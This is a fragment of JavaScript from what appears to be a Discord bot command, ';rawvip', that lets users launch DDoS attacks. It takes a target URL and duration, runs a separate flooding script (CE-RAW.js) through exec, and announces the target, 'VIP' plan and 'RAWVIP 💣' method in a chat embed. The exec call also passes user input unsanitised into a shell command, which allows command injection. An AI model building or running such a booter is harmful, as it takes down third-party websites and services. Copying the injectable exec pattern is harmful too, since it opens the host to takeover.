...
if(!args[0]) {
	...
	.setColor('RANDOM')
	.setTitle('WARRING')
	.setDescription("`Ex ;rawvip https://example.com/ 60`")
...
exec(`node CE-RAW.js ${host} ${duration}`, (error, stdout, stderr) => {
});
...
const embed = new Discord.MessageEmbed()
  ...
  .setDescription("**𝓟𝓵𝓪𝓷**: `VIP 👨` \n **𝓣𝓪𝓻𝓰𝓮𝓽** : `" + host + "` \n **𝓜𝓮𝓽𝓱𝓸𝓭** : `RAWVIP 💣` \n **𝓣𝓲𝓶𝓮** : `" + duration + "`")
	.setFooter('© Developer: fb.com/hwangsangg', client.user.avatarURL)
	.setTimestamp()
	.setImage(attackgif)
	.setThumbnail("")
